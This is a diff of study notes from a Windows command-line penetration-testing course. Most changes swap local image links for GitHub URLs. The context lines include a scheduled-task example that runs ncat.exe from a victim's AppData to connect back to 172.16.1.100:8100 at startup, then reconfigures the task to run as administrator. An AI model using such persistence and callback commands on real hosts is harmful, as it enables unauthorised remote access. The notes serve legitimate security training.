@@ -4,10 +4,11 @@ The built-in command shell CMD.exe and PowerShell are two implementations includ
 
 There are some key differences between Windows Command Prompt and PowerShell. One key difference is that you can run Command Prompt commands from a PowerShell console, but to run PowerShell commands from a Command Prompt, you would have to preface the command with `powershell` (i.e., `powershell get-alias`). The following table outlines some other key differences.
 
-![[cmd_vs_pshell.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/cmd_vs_pshell.png)
+
 ## Command Prompt Basics : 
 
-The Command Prompt, also known as [cmd.exe](https://https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd) or CMD, is the default command line interpreter for the Windows operating system. While often overshadowed by its sleek counterpart [PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2), knowledge of cmd.exe and its commands continue to pay dividends even in modern times.
+The Command Prompt, also known as [cmd.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd) or CMD, is the default command line interpreter for the Windows operating system. While often overshadowed by its sleek counterpart [PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2), knowledge of cmd.exe and its commands continue to pay dividends even in modern times.
 
 `How do we access the Command Prompt?`
 
@@ -82,7 +83,7 @@ If we need to `clear` the screen and provide us an empty prompt. We can use the 
 
 Command history is a dynamic thing. It allows us to `view previously ran commands` in our Command Prompt's `current active session`. The last way we can view our history is by utilizing the command `doskey /history`. [Doskey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/doskey) is an MS-DOS utility that keeps a history of commands issued and allows them to be referenced again.
 
-![[useful_commands.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/useful_commands.png)
 
 When running a command or process we want to interrupt, we can do so by pressing the `ctrl+c` key combination.
 
@@ -94,7 +95,7 @@ Before doing anything on a host, it is helpful to know where we are in the files
 
 We can get a printout of the entire path we specify and its subdirectories by utilizing the `tree` command. We can utilize the `/F` parameter with the tree command to see a listing of each file and the directories along with the directory tree of the path.
  
-![[interest_folder.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/interest_folder.png)
 
 ## Working with Directories and Files : 
 
@@ -127,11 +128,11 @@ Just like directories, we have several options to copy or move files. `Copy` and
 
 Gathering `system information`(aka `host enumeration`) may seem daunting at first; however, it is a crucial step in providing a good foundation for getting to know our environment. The goal of `host enumeration` is to provide an overall picture of the target host, its environment, and how it interacts with other systems across the network.
 
-![[InformationTypesChart_Updated.webp]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/InformationTypesChart_Updated.webp)
 
 As we can see from the diagram above, the types of information that we would be looking for can be broken down into the following categories :
 
-![[general_info.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/general_info.png)
 
 CMD provides a one-stop shop for information via the `systeminfo` command. It is excellent for finding relevant information about the host, such as hostname, IP address(es), if it belongs to a domain, what hotfixes have been installed, and much more. Having quick access to things such as the OS version, hotfixes installed, and OS build version can help us quickly determine from a quick Google or [ExploitDB](https://www.exploit-db.com/) search, if an exploit exists that can be quickly leveraged to exploit this host further, elevate privileges, and more.
 
@@ -224,7 +225,7 @@ On a Windows host, environment variables are `not` case sensitive and can have s
 - **Local:**
     - Local variables are only accessible within a `local` context. `Local` means that the data stored within these variables can only be accessed and referenced within the function or context in which it has been declared.
 
-![[scope.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/scope.png)
  
 Creating environment variables is quite a simple task. We can use either `set` or `setx` depending on the task at hand and our overall goal.
 
@@ -237,7 +238,7 @@ C:\htb> setx DCIP 172.16.5.2
 
 Some crucial variables we should be aware of when performing enumeration on a host's environment : 
 
-![[important_var.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/important_var.png)
 
 ## Managing Services : 
 
@@ -306,7 +307,7 @@ We can utilize the `schtasks` command.
 
 Display Scheduled Tasks :
 
-![[query_syntax_stask_display.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/query_syntax_stask_display.png)
 
 ```cmd-session
 C:\htb> SCHTASKS /Query /V /FO list
@@ -314,7 +315,7 @@ C:\htb> SCHTASKS /Query /V /FO list
 
 Create a New Scheduled Task :
 
-![[query_syntax_stask_create.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/query_syntax_stask_create.png)
 
 ```cmd-session
 C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
@@ -322,7 +323,7 @@ C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\A
 
 Change the Properties of a Scheduled Task : 
 
-![[query_syntax_stask_change.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/query_syntax_stask_change.png)
 
 ```cmd-session
 C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
@@ -330,7 +331,7 @@ C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
 
 Delete the Scheduled Task(s) : 
 
-![[query_syntax_stask_delete.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/query_syntax_stask_delete.png)
 ## CMD Vs. PowerShell : 
 
 [PowerShell](https://docs.microsoft.com/en-us/powershell/) has become increasingly prominent among IT and Infosec professionals. It has widespread utility for System Administrators, Penetration Testers, SOC Analysts, and many other technical disciplines where ever Windows systems are administered. Many of them are using PowerShell to automate tasks they must accomplish daily. Among some of these tasks are:
@@ -417,7 +418,7 @@ If it bothers us to have a ton of output on our screen all the time, we can remo
 
 `Hotkeys` can enable us to perform more complex actions that typically require a mouse with just our keys. Below is a quick list of some of the more useful hotkeys.
 
-![[hotkeys_ps.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/hotkeys_ps.png)
 
 One of PowerShell's best functionalities must be tab completion of commands. We can use `tab` and `SHIFT+tab` to move through options that can complete the command we are typing.
 
@@ -435,7 +436,7 @@ PS C:\Windows\system32> Set-Alias -Name gh -Value Get-Help
 
 Below we also include a list of several aliases we find to be most helpful. Some commands have more than one alias as well.
 
-![[helpful_aliases.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/helpful_aliases.png)
 
 ## All About Cmdlets and Modules : 
 
@@ -541,7 +542,7 @@ Below we will quickly list a few PowerShell modules and projects we, as penetrat
 
 Several accounts are created in every instance of Windows as the OS is installed to help with host management and basic usage. Below is a list of the standard built-in accounts.
 
-![[built_in_acc.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/built_in_acc.png)
 
 In a nutshell, `Active Directory` (AD) is a directory service for Windows environments that provides a central point of management for `users`, computers, `groups`, network devices, `file shares`, group policies, `devices`, and trusts with other organizations.
 
@@ -659,7 +660,7 @@ PS C:\htb> Set-ADUser -Identity MTanaka -Description " Sensei to Security Analys
 
 The table below lists the commonly used cmdlets used when dealing with objects in PowerShell.
 
-![[common_comm.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/common_comm.png)
 
 Permissions, simplified, are our host's way of determining who has access to a specific object and what they can do with it. These permissions allow us to apply granular security control over our objects to maintain a proper security posture. Some of the key permission types are :
 
@@ -727,7 +728,7 @@ PS C:\htb>  Get-Service | where DisplayName -like '*Defender*'
 
 The output above is an excellent example of this utilizing the `-like` Comparison operator. Below is a quick list (not all-encompassing) of other useful expressions we can utilize :
 
-![[comp_op.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/comp_op.png)
 
 Some tools exist, like `Snaffler`, `Winpeas`, and the like, that can search for interesting files and strings, but what if we `cannot` bring a new tool onto the host ?
 [Select-String](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7.2) (`sls` as an alias) for those more familiar with using the Linux CLI, functions much in the same manner as `Grep` does or `findstr.exe` within the Windows Command-Prompt.
@@ -835,7 +836,7 @@ A host systems Registry `root keys` are stored in several different files and ca
 
 Each Windows host has a set of predefined Registry keys that maintain the host and settings required for use. Below is a breakdown of each hive and what can be found referenced within.
 
-![[predef_keys.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/predef_keys.png)
 
 From the CLI, we have several options to access the Registry and manage our keys. The first is using [reg.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg). `Reg` is a dos executable explicitly made for use in managing Registry settings. The second is using the `Get-Item` and `Get-ItemProperty` cmdlets to read keys and values.
 
@@ -913,15 +914,15 @@ A clear understanding of event logging is crucial to success in infosec. There a
 
 The main four log categories include application, security, setup, and system. Another type of category also exists called `forwarded events`.
 
-![[event_log.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/event_log.png)
 
 There are five types of events that can be logged on Windows systems:
 
-![[event_types.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/event_types.png)
 
 Each log can have one of five severity levels associated with it, denoted by a number:
 
-![[event_security.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/event_security.png)
 
 The Windows Event Log provides information about hardware and software events on a Windows system. All event logs are stored in a standard format and include the following elements:
 
@@ -1006,7 +1007,7 @@ PS C:\htb> Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-
 
 Networking with Windows hosts functions much like any other Linux or Unix-based host. The TCP/IP stack, wireless protocols, and other applications treat most devices the same, so there isn't much to learn there that's new. Below we will quickly cover some standard protocols you could run into when administering or pentesting Windows hosts.
 
-![[protocol.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/protocol.png)
 
 Local host access is when we are directly at the terminal utilizing its resources as you are right now from your PC. Usually, this will not require us to use any specific access protocols except when we request resources from networked hosts or attempt to access the Internet.
 
@@ -1042,7 +1043,7 @@ PS C:\htb> netstat -an
 
 PowerShell has several powerful built-in cmdlets made to handle networking services and administration. The NetAdapter, NetConnection, and NetTCPIP modules are just a few that we will practice with today.
 
-![[net_cmd.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/net_cmd.png)
 
 We can set up an SSH server on a Windows target using the [Add-WindowsCapability](https://docs.microsoft.com/en-us/powershell/module/dism/add-windowscapability?view=windowsserver2022-ps) cmdlet and confirm that it is successfully installed using the [Get-WindowsCapability](https://docs.microsoft.com/en-us/powershell/module/dism/get-windowscapability?view=windowsserver2022-ps) cmdlet.
 
@@ -1147,7 +1148,7 @@ The easiest way to think of it is that a script is an executable text file conta
 
 To familiarize ourselves with some file extensions we will encounter while working with PowerShell scripts and modules, we have put together a small table with the extensions and their descriptions.
 
-![[ps_extensions.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/ps_extensions.png)
 
 A module is made up of `four` essential components :
 
@@ -1278,7 +1279,7 @@ Export-ModuleMember -Function Get-Recon -Variable Hostname
 
 PowerShell currently uses `three` different Scope levels :
 
-![[ps_scope.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%201/Easy/Introduction%20to%20Windows%20Command%20Line/Images/ps_scope.png)
 
 From here we can save this file in our Module directory we created and import it from within PowerShell for use.
 
